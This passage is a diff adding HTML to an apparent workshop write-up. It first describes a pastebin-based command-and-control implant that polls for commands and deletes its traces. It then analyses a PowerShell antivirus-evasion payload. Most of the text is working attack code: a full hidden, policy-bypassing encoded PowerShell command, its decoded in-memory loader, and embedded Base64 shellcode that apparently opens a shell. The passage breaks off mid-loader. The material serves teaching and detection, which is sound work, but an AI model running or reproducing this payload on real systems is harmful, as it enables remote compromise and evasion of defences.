+&lt;p&gt;&lt;strong&gt;Step 7:&lt;/strong&gt; 🗑️ &lt;strong&gt;Implant to binpaste&lt;/strong&gt;&lt;br&gt;
+POST: Delete the command&lt;br&gt;
+&lt;em&gt;Victim removes the original command to hide evidence.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 8:&lt;/strong&gt; 📥 &lt;strong&gt;Red Team to binpaste&lt;/strong&gt;&lt;br&gt;
+GET: Fetch the result&lt;br&gt;
+&lt;em&gt;Attacker downloads the stolen data/results.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Step 9:&lt;/strong&gt; 🗑️ &lt;strong&gt;Red Team to binpaste&lt;/strong&gt;&lt;br&gt;
+POST: Delete the result&lt;br&gt;
+&lt;em&gt;Attacker removes all traces of the conversation.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;🔑 Key Feature:&lt;/strong&gt; Automatic evidence removal makes detection extremely difficult - it&apos;s like the conversation never happened!&lt;/p&gt;
+&lt;h3&gt;Technical Components&lt;/h3&gt;
+&lt;h4&gt;Two-Program Architecture&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;Controller (&lt;code&gt;binpastec2_p1.py&lt;/code&gt;)&lt;/strong&gt; - Attacker&apos;s command interface&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Sends commands via pastebin posts&lt;/li&gt;
+&lt;li&gt;Retrieves stolen data from victim computers&lt;/li&gt;
+&lt;li&gt;Can control multiple victims simultaneously&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Agent (&lt;code&gt;binpaste_client_p1.py&lt;/code&gt;)&lt;/strong&gt; - Victim&apos;s implant&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Polls pastebin every 10 seconds for new commands&lt;/li&gt;
+&lt;li&gt;Executes commands and uploads results&lt;/li&gt;
+&lt;li&gt;Automatically cleans up evidence&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Attack Advantages&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Legitimate Infrastructure:&lt;/strong&gt; Uses real pastebin service&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Encrypted Channel:&lt;/strong&gt; HTTPS traffic appears normal&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Scalable:&lt;/strong&gt; One controller handles multiple victims&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Persistent:&lt;/strong&gt; Continues running until manually removed&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Workshop Context&lt;/h3&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/setup.D3nfycEf_ZLDrO3.webp&quot; alt=&quot;Workshop Setup&quot;&gt;
+&lt;em&gt;The workshop setup showing the attacker and victim machines.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://gr1d-init.github.io/_astro/modify.DyDOuX0Q_13LgVr.webp&quot; alt=&quot;Code Modification Example&quot;&gt;
+&lt;em&gt;Example of code modification required in the workshop scripts.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Educational Demonstration Only:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Controlled environment with test systems&lt;/li&gt;
+&lt;li&gt;Scripts contain incomplete code marked &lt;code&gt;# (your code here)&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;No actual victims or data theft occurred&lt;/li&gt;
+&lt;li&gt;Used legitimate pastebin service for demonstration&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Learning Objectives:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand modern C2 communication methods&lt;/li&gt;
+&lt;li&gt;Recognize legitimate services used maliciously&lt;/li&gt;
+&lt;li&gt;Practice detection and response techniques&lt;/li&gt;
+&lt;li&gt;Learn defensive strategies&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Key Takeaways&lt;/h3&gt;
+&lt;p&gt;This attack is smart because it looks completely normal - just regular visits to a pastebin website. The hacker doesn&apos;t need special servers or suspicious connections. The 10-second check-ins are perfectly timed: fast enough to work well, slow enough to stay hidden.&lt;/p&gt;
+&lt;p&gt;What makes this really scary is how it cleans up after itself. Most computer viruses leave clues behind, but this one automatically deletes everything as it goes. It&apos;s like having a conversation that erases itself - investigators can&apos;t figure out what happened.&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;The Shellshock workshop also covered methods used by attackers to evade antivirus detection with their payloads. The following analysis, also part of the workshop materials, delves into PowerShell-based AV evasion techniques.&lt;/p&gt;
+&lt;h2&gt;PowerShell Payload AV Evasion Analysis&lt;/h2&gt;
+&lt;p&gt;This document analyzes the multi-layered techniques a PowerShell payload uses to evade Antivirus (AV) detection, primarily through obfuscation and in-memory execution.&lt;/p&gt;
+&lt;h3&gt;Initial Encoded Command&lt;/h3&gt;
+&lt;p&gt;The attack begins with a heavily obfuscated PowerShell command, executed stealthily:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;powershell.exe -NoLogo -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -EncodedCommand aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAkAGUAbgB2ADoAdwBpAG4AZABpAHIAKwAnAFwAcwB5AHMAbgBhAHQAaQB2AGUAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQBlAGwAcwBlAHsAJABiAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAJwB9ADsAJABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG9jAGUAcwBTAHQAYQByAHQASQBuAGYAbwA7ACQAcwAuAEYAaQBsAGUATgBhAG0AZQA9ACQAYgA7ACQAcwAuAEEAcgBnAHUAbQBlAG4AdABzAD0AJwAtAG4AbwBwACAALQB3ACAAaABpAGQAZABlAG4AIAAtAGMAIAAmACgAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAYwByAGUAYQB0AGUAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4ATQBlAG0AbwJ5AFMAdAByAGUAYQBtAFIAZQBhAG0AKAAuAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAoACgAJwAnAEgANABzAEkAQQBQAHQASQBMAFcAZwBDAEEANwBWAFgAYgBXACsAYgBTAEIARAArAFgAcQBuAC8AQQBWAFcAVwBqAEYAWABIAEwANgBtAFQAcABwACcAJwArACcAJwBFAGkAMwBXAEoARABqAEcAcwBuAEoAaABqAGMAMgBMAFYATwBHAEIAYgBZAGUAQQAwAEUARgB0AHUAawAxAC8AOQArAHMAeABqAHkAbwBqAHAAMwB1AHsAMQB9AE8ASwBoAE0AegB1AHoAcwB6AE8AUAB2AFAATQB6AE4AcABOAEEANQB1AFIATQBCAEEAaQBTAHgAewAxAH0AKwB2AEgAOABuAEYATQAvAFkAaQBxADIAMQBJAEYAYgB1AEIAaQBkADEAbwBXAEwAOQBPAFUARwBuAHQAYQBmAFYAUwBuAFEAagBuADYAMgBFAEMAMABHAGMAbwB5AGoAcQBoAFcAdQBMAEIASQB2ACcAJwArACcAJwB6ADgAMgA0AGEAeAB6AGgAZwArADMASABqAEUAagBPAFUASgBIAGkAOQBwAEEAUQBuAFkAawAzADQAUwA1AGoANgBPAE0AewAxAH0ASAAxADgAcwA3AGIARABQAGgAaAAxAEQANQBzADMARgBKAHcANgBWAEYAQwA3AEcAcwBhADkAawArAEYAbwA1AFEANABQAEMAMQBZAFcAaABiADMATABXAEcASABsAEgAQwB4AE8AcgAzADcAOQBYAGEALwBLAGkAOQBhAE0AagAzAHEAVQBVAFQAcwBhAHAAbgBDAGMAUAByAGgAawAnACcAKwAnACcATgBwAHQAUwBiADgAcgBQAEUATgBKADEAbQBFAHgAZQBxAEkAMgBIAEcAWQBoAEMANQByAFQARQBuAHcANgBiAGgAaABCAEkAbgBsADQAaQB1AHcAdABzAEUAagB6AFAAegBRAFMAYQBwAHcAbQBxAGYAegB4AEoAaQBsAGMAVgBBAGMAaQA5AHYAewAxAH0AUwA0AGwAVgArAEIAegBIAG8AWQAwAGMASgA4AHsAMQB9AEoAVQBxADAATABjADcANwBEAGYATABIADQAUQA1AHcAWAAyADkAKwBrAEEAUwBOAHIAMwBGAEEARABoAHUATQB3ADAAbgBHADgASQBUAHsAMQB9AE8ARwBuADAAcgBjAEMAaQArAHcAZQA0AEMAdABIAFEAVwBrADgAQgBiADEARwBvAGcAdABnAGwAWABXAEsAdwBFAEsAYQBWADEANABiACsAWQBFAGEALwB3AHQAZwBUAHYAcgBVAHIAaQBjAHkAVwBRAEcAcgBPADQAVgBvAGUAdwBIAGoAcgBvAEsASABSAFMAaQB2AGUAcQAxAFEATwBlAGMAaQA3AFUANABIAG4AawBBACcAJwArACcAJwAwAEQANABrADYAUABvAGwAaAAnACcAKwAnACcAegBhAGYASgBzAGQANABOAEQAVABSAFAAbgBNADgAeABVAE0AUABvAHYAagBNAEMARwA1ADcAbwBYAFEAcQBnAHMAagAyAE4AeABpAFkAewAxAH0AegBCAHMARABLAEoAVQAxAHgAYgBQAEMASQB1AFYATwB3AG8ATwBBAG4AcgBiAHoAWABYAEwAbgBWAEIATQA3AE8AWABNAEQATQAzAFEAKwBJAHMAbgB2AFIAZgBVAEsAQgBpAFgAYgBwAGMANQBuAFUAKwA5ADcAQgBMAEEAdAB6AEwAQQBtAHQATgA3AEoASwB5ADQAcQBHAG8AWQBKAGYAaQBIAEoARgBHAEsAWABZAEYALwBvAG4AVgBZAGcARQA3AFAAVQB5AHgAewAxAH0AegBFAE8ATQB5AGYASABMADIAcgB5AG0AcgBCAEgAWABTAGsAbAAxAE0ARQB4AHMAaQBHAHkAQwBYAGcARgBRAGEAKwA5AGQARwBZAGYATwBiAEcAcQBCAGkATwA4AEIAdgBUADIAWQAyAEIAcgB4AFkAVgBFAHcAYQBWADAAawBSAHgAewAxAH0AdQBUAHMAZgBnADEAQwAxAFMANgAwAGsAcQBRAHYAagBGAEQATABWAHIAZwBzADYAdABpAGgAMgA2AGcASQBLAEUAbABJAHMAbwB7ADEAfQBTAEYAKwBXAGYAMQB5AGQAMQBSAFMAaABtAHgAcgBZAFMAVgA1AGgAYQAxAGwAMgBnAFcAdQAzAGIARABJAEcARgB4AGEAawBOAFkAQQBZAEcASgAnACcAKwAnACcASABtAEcAYgBXAEoAUQBEAFUAaABmADYAeABNAEYAUwBwAGgATwB2ADMATAAxADYARQBJADYAdQBSAFMAbQBrAEQAMQBqAGEAUQBEAGgAZwBoAHMATwBnAE0AMAA2AFcARwBCAHoAZABFADYAUABXADAARABGAFQAMQB4AEgARgBhAHgARABLAEsANABkAEMATABRAC8AcQBSAEoARQBsAE8AYgAwAHMARAB6AHYAJwAnACsAJwAnAFYAdwA0ADYAVwBxAGIARABuAFAAUQBlAG0AUgBPAFMAewAxAH0AbQB4AEIAdABuAFkAYQBzAEwAcABnAGsAewAxAH0AbABDAEcATwBNAGoAQQByAHYALwBuAHgASwA4AEYAaQBIAHYAVABqAFgARQBSAEgATABIAE0AcwBMAG0AVQBNAHsAMQB9ADQARABsAFUAUwAvAFYAVABzAEwAQwA0AHgAeQBSAEcASQBHAGEAQwBoAHgAdQBKAGEAJwAnACsAJwAnAHMAQgBKADkAMgA5AHEAVgBHAC8ATgBDAFUAUwBlADkAawAzAEEAdQAzAEMAQgA1AHsAMQB9AHUAZABGAE0AUwBUAGYATQBtAFQAcAB5AEIAbABSAFgAbQBYADQAcgBrADYASABoACsAeQBwAHAAcQB4ADYAJwAnACsAJwAnAE0ATQAwAFAAMgB4AHEAdwBWAGYAewAxAH0AMQBNACsAZwBPADkAMQAwAGQAeABiACsAZQA3AFMARQAxAFUAdQBTADkAbABXAGwAdABDAGQAcAA5ADgATgBnAGUAUwBZAFkAQQBlADYAUQA2ADEAdQA1ADIASwBuAE8ANwBRAFUAegAzAFkAUQBGAEoAOQBXADIAcgBOAFcAcAA3AFUAVQByAHAARABYAGYASgBsADAAawBLAGUAcgB2AFcAMQBUAG4AdQBtAE4AcwArAG8AUgBCADUAMABWACcAJwArACcAJwBVAGYAOQA2AGEAUAA5AFIANwB0AHkAcAA5AFAALwB0AHAAdQBnAHEAOQBFAEEAKwBjAHEAMQBvADcAUwBQAGwAVgB4AC8AeABmAFYAbgBxADgAdABoAFQAOAA3AEgATgBoADkAcgB0ADQAbABNAHsAMQB9AE4AaABIAFYAbQA0ADEAMAA4AGQAVABNADUASwBtAHMAagBMAFQAegBFAGoAMQBQAG0ANAA5AHoAUgB3ACcAJwArACcAJwAyAE8ANABvAHYAJwAnACsAJwAnAHcAYgB4AEsAZABzAFAASQBiAE0ATABUAGIAZwA4ADIAZwBmAE0AdwBvAG0AJwAnACsAJwAnAGMAUABJADMAQgBYAE0AMgBjAEQAZwBtAGUAcQBoAHoATQBQAGEAUQBqAHAAdAB3AEgAVgBsADkAcwB1AGsAaABRAGIANwBmAEUAeQBZAEcANAAxAFUAWQBPAGQAdABvAHgARwBUAG4AYgBiAGIAMwA0AHgAUgB3AFIASABJAGQASgBrAGgAQgBRAEsAVwBiAGwARwAxAHIAYgBYAGIASgB1AFMAeABzADgARQAnACcAKwAnACcATAA5AEwASABUAGEAUwAnACcAKwAnACcAcgBRAGIAZgA0AGwAYgBSAGwAZgAnACcAKwAnACcATgAvADcAMAB2AFIAQQBWAHkAVwAyAGMAeQArAEQAegAyAEMAVAB3AE4AbwBKAHIASABXAFAASAA1AHkAQQByADAARgBNAFYATwBLAEMAegBkAGkATgByAHMAZgBnAHIAdABIAGEAYgBXAFYAdgAxADEAcQBSAHcAVQBmAGoAOAB0AFMANQAzAG4ANwB1AHUARQAyAFQANgA4AEgAYgBCADUALwBhAHkAMQBYAGIANQA3AHEAZQByAFgAcwBJAHoAcQBRAHYALwBiAHYAbABWAEUATwBGAC8AeAByAEUAVwB5AFYANAA4AE0AMQBzAE8AMQBjAGoAVwA3AHIAdgBtAFYAUQB5AHIAbwBkAG4AcwA4AFMAUgBCADQAbwBtAEkAWQBOAGMAMwBYAFMAMQAyADUAMABuAGgAVwBCAHoARABjAHUAUwBzACcAJwArACcAJwBkAGMAYgBOAE0ALwA0AGQAOQBEAE0ANQBPAFAAQgAxAHMAagBnAHYAVAB6AEYAOQByAGIAcABiADgAQwBIAFgAbAArAEgAOAAzADAAbAAyAHgATQBwADkAVQBpAC8AUAB3AFUATQBsAHAAcwB0AHMAdwB7ADEAfQBUAGIAWABtAC8AcABzAHQAagBKAC8AZgByAFQAQQB2AEgAYQBIAGIAVwBEAFgAdQBmAE8AMwAxAEQAUwBWAHYAMgB4AEYANQAvAHUAZQBmAFkARQBTAGQAdQB0AHIAVwBMAGkAdwA5AEEAOABMAGwAQgBBAHYAYgBwAGUARgBGAHgAagA5AHUAVwB6AHYAdgBBACsAMwBjAFYAUgB6AE4ARwB6ADMAagArAFcAcAA4AGIAVwBYAEgAaQBXAHgAVAA0AEQALwAyAHIAcgBFAE4ASwBHAEMAdABGAFIAeABxAEgAaABHAHUASQBJAHIALwBkAHIASABBAGMAWQBBAHIAWABBAGIAZwB3AGwATwBtAEwASwBBADEAdAAzAGgARgA1ADYANABKAG0AdgBHACsAUgB2AEcATQBiAGEAdQA3AFYAbwBhACsAYQA4AEMAaABZAGUAKwBxAFQANQBkAFQANQArAFEAeAA4AGgASQBMAEEAYwA3AFUAeAB4AEkASABIAC8ASABwAHIAOQA2AG4AVgBnAGcAYgBYADIAcgBVADYAZQBlAEsALwAvAFcAVABkAE0ATQByAEUAMwBGAGkAZAB0ADgAZwBjAG0AdABJADYAegBhADIAJwAnACsAJwAnAEQAUQBlAEkASwBvAHYAagBiADAAWQBLAHIARQBJAE8AUwAvAEMAcABlAHIAMABFAEgATwA2ACsAZwBnAEUASgBGADMAMQBjADEARABxAEEAVQBoAHYAUQA1AGYATQBXADUASAB0AG4AdwBIAEQAMgBBAHIAUQAxAEgAbgAvAE4AYgAwAEoANABtAFkATwBJAEkAMwB3AHMAJwAnACsAJwAnAFYAeAB1ADgASQB6ACsAOABjAEYAUwB1AEoAZgB5AHQAeABpAHUAcgBzAHcANAAvAHoATAA4AFIANQBtAHYAdQBIADEAVABlAFIAcQBWAFgAZgB3AC8AUABMADkATQB1AEoAewAxAH0AMwAzAHQAJwAnACsAJwAnADkAdwBFAHcAJwAnACsAJwAnAHQAUQBnAEQAUQBSADIAYQBEAE0AWAA3AGkAOAA5AEIASABJAHAAYwBlAFIAewAxAH0AaABDAEEAMABrAGcAbABzADgALwBBAC8AQgBkAGMAcQBPAHIAdQBCADYAbQBiAGUANQB2AHcARgBiAE4ARQBxAHUAaQB3AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBaACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This deobfuscation can also be performed manually for analysis, using the Base64 string from the first-stage script, to obtain the second-stage script:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;$compressed = (((&quot;H4sIAPtILWgCA7VXbW+bSBD+Xqn/AVWWjFXHL6mTpp&quot; + &quot;Ei3WJDjGsnJhjc2LVOGBbYeA0EFtuk1/9+sxjyojp3u{1}OKhMzuzszOPvPMzNpNA5uRMBAiSx{1}+vH8nFM/Yiq21IFbuBid1oWL9OUGntafVSnQjn62EC0GcoyjqhWuLBIv&quot; + &quot;z824axzhg+3HjEjOUJHi9pAQnYk34S5j6OM{1}H18s7bDPhh1D5s3FJw6VFC7Gsa9k+Fo5Q4PC1YWhb3LWGHlHCxOr379Xa/Ki9aMj3qUUTsapnCcPrhk&quot; + &quot;NptSb8rPENJ1mExeqI2HGYhC5rTEnw6bhhBInl4iuwtsEjzPzQSapwmqfzxJilcVAci9v{1}S4lV+BzHoY0cJ8{1}JUq0Lc77DfLH4Q5wX29+kASNr3FADhuMw0nG8IT{1}OGn0rcCi+we4CtHQWk8Bb1GogtglXWKwEKaV14b+YEa/wtgTvrUricyWQGrO4VoewHjroKHRSiveq1QOeci7U4HnkA&quot;+&quot;0D4k6Polh&quot;+&quot;zafJsd4NDTRPnM8xUMPovjMCG57oXQqgsj2NxiY{1}zBsDKJU1xbPCIuVOwoOAnrbzXXLnVBM7OXMDM3Q+IsnvRfUKBiXbpc5nU+97BLAtzLAmtN7JKy4qGoYJfiHJFGKXYF/onVYgE7PUyx{1}zEOMyfHL2rymrBHXSkl1MExsiGyCXgFQa+9dGYfObGqBiO8BvT2Y2BrxYVEwaV0kRx{1}uTsfg1C1S60kqQvjFDLVrgs6tih26gIKElIso{1}SF+Wf1yd1RShmxrYSV5ha1l2gWu3bDIGFxakNYAYGJ&quot;+&quot;HmGbWJQDUhf6xMFSphOv3L16EI6uRSmkD1jaQDhghsOgM06WGBzdE6PW0DFT1xHFaxDKK4dCLQ/qRJElOb0sDzv&quot;+&quot;Vw46WqbDnPQemROS{1}mxBtnYasLpgk{1}lCGOMjArv/nxK8FiHvTjXERHLHMsLmUM{1}4DlUS/VTlLC4xyRGIGaChxuJa&quot;+&quot;sBJ929qVG/NCUSe9k3Au3CB5{1}udFMSTfMmTpyBlRXmX4rk6Hh+yppqx6&quot;+&quot;MM0P2xqwVf{1}1M+gO910dxb+e7SE1UuS9lWltCdp98NgeSYYAe6Q61u52KnO7QUz3YQFJ9W2rNWp7UUrpDXfJl0kKervW1TnumNs+oRB50V&quot;+&quot;Uf96aP9R7typ9P/tpugq9EA+cq1o7SPlVx/xfVnq8thT87HNh9rt4lM{1}NhHVm4108dTM5KmsjLTzEj1Pm49zRw&quot;+&quot;2O4ov&quot;+&quot;wbxKdsPIbMLTbg82gfMwom&quot;+&quot;cPI3BXM2cDgmeqhzMPaQjptwHVl9sukhQb7fEyYG41UYOdtoxGTnbbb34xRwRHIdJkhBQKWblG1rbXbJuSxs8E&quot;+&quot;L9LHTaS&quot;+&quot;rQbf4lbRlf&quot;+&quot;N/70vRAVyW2cy+Dz2CTwNoJrHWPH5yAr0FMVOKCzdiNrsfgrtHabWVv11qRwUfj8tS53n7uuE2T68HbB5/ay1Xb57qerXsIzqQv/bvlVEOF/xrEWyV48M1sO1cjW7rvmVQyrodns8SRB4omIYNc3XS1250nhWBzDcuSs&quot;+&quot;dcbNM/4d9DM5OPB1sjgvTzF9rbpb8CHXl+H830l2xMp9Ui/PwUMlpstsw{1}TbXm/pstjJ/frTAvHaHbWDXufO31DSVv2xF5/uefYESdutrWLiw9A8LlBAvbpeFFxj9uWzvvA+3cVRzNGz3j+Wp8bWXHiWxT4D/2rrENKGCtFRxqHhGuIIr/drHAcYArXAbgwlOmLKA1t3hF564JmvG+RvGMbau7Voa+a8ChYe+qT5dT5+Qx8hILAc7UxxIHH/Hpr96nVggbX2rU6eeK//WTdMMrE3Fidt8gcmtI6za2&quot;+&quot;DQeIKovjb0YKrEIOS/Cper0EHO6+ggEJF31c1DqAUhvQ5fMW5HtnwHD2ArQ1Hn/Nb0J4mYOII3ws&quot;+&quot;Vxu8Iz+8cFSuJfytxiursw4/zL8R5mvuH1TeRqVXfw/PL9MuJ{1}33t&quot;+&quot;9wEw&quot;+&quot;tQgDQR2aDMX7i89BHIpceR{1}hCA0kgls8/A/BdcqOruB6mbe5vwFbNEquiwwAAA{0}{0}&quot;) -f&quot;=&quot;,&quot;Z&quot;)))
+$bytes = [System.Convert]::FromBase64String($compressed)
+$stream = New-Object System.IO.MemoryStream(, $bytes)
+$gzip = New-Object System.IO.Compression.GzipStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
+$reader = New-Object System.IO.StreamReader($gzip)
+$script = $reader.ReadToEnd()
+Write-Output $script
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This &quot;manual method&quot; reveals the second-stage script, which is then analyzed for its shellcode execution capabilities.&lt;/p&gt;
+&lt;h3&gt;Second-Stage Script: In-Memory Shellcode Execution&lt;/h3&gt;
+&lt;p&gt;The deobfuscated second-stage script (&lt;code&gt;payload.ps1&lt;/code&gt;) is designed to execute shellcode directly in memory, a common tactic to bypass file-based AV detection.&lt;/p&gt;
+&lt;p&gt;Key features of this script:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Dynamic Function Resolution&lt;/strong&gt;: It avoids static analysis of imported functions by dynamically resolving critical Windows API functions (e.g., &lt;code&gt;VirtualAlloc&lt;/code&gt;, &lt;code&gt;CreateThread&lt;/code&gt;, &lt;code&gt;VirtualProtect&lt;/code&gt;, &lt;code&gt;WaitForSingleObject&lt;/code&gt;). This is done using reflection and custom functions like &lt;code&gt;paE&lt;/code&gt; (likely for &lt;code&gt;GetProcAddress&lt;/code&gt; via &lt;code&gt;GetModuleHandle&lt;/code&gt;) and &lt;code&gt;vXZ&lt;/code&gt; (for creating delegate types on the fly).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Dynamic Assembly Creation&lt;/strong&gt;: The script uses &lt;code&gt;DefineDynamicAssembly&lt;/code&gt; and &lt;code&gt;DefineDynamicModule&lt;/code&gt; to create .NET assemblies in memory. This allows it to define and use types, such as delegates for P/Invoke calls, without writing to disk.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Shellcode Handling&lt;/strong&gt;: The shellcode is stored as a Base64 encoded string within the script. It&apos;s decoded and copied into an executable memory region allocated by &lt;code&gt;VirtualAlloc&lt;/code&gt;. &lt;code&gt;VirtualProtect&lt;/code&gt; might be used to change memory permissions before execution.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;function paE {
+        Param ($jJ5, $a_TA6)
+        $pRE8k = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(&apos;\&apos;)[-1].Equals(&apos;System.dll&apos;) }).GetType(&apos;Microsoft.Win32.UnsafeNativeMethods&apos;)
+
+        return $pRE8k.GetMethod(&apos;GetProcAddress&apos;, [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($pRE8k.GetMethod(&apos;GetModuleHandle&apos;)).Invoke($null, @($jJ5)))), $a_TA6))
+}
+
+function vXZ {
+        Param (
+                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $cpn5o,
+                [Parameter(Position = 1)] [Type] $ycb = [Void]
+        )
+
+        $aGf = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&apos;ReflectedDelegate&apos;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&apos;InMemoryModule&apos;, $false).DefineType(&apos;MyDelegateType&apos;, &apos;Class, Public, Sealed, AnsiClass, AutoClass&apos;, [System.MulticastDelegate])
+        $aGf.DefineConstructor(&apos;RTSpecialName, HideBySig, Public&apos;, [System.Reflection.CallingConventions]::Standard, $cpn5o).SetImplementationFlags(&apos;Runtime, Managed&apos;)
+        $aGf.DefineMethod(&apos;Invoke&apos;, &apos;Public, HideBySig, NewSlot, Virtual&apos;, $ycb, $cpn5o).SetImplementationFlags(&apos;Runtime, Managed&apos;)
+
+        return $aGf.CreateType()
+}
+
+[Byte[]]$sSYI = [System.Convert]::FromBase64String(&quot;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCABFcAAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==&quot;)
+[Uint32]$f21aS = 0
+$dQUM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualAlloc), (vXZ @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $sSYI.Length,0x3000, 0x04)
+
+[System.Runtime.InteropServices.Marshal]::Copy($sSYI, 0, $dQUM, $sSYI.length)
+if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((paE kernel32.dll VirtualProtect), (vXZ @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($dQUM, [Uint32]$sSYI.Length, 0x10, [Ref]$f21aS)) -eq $true) {
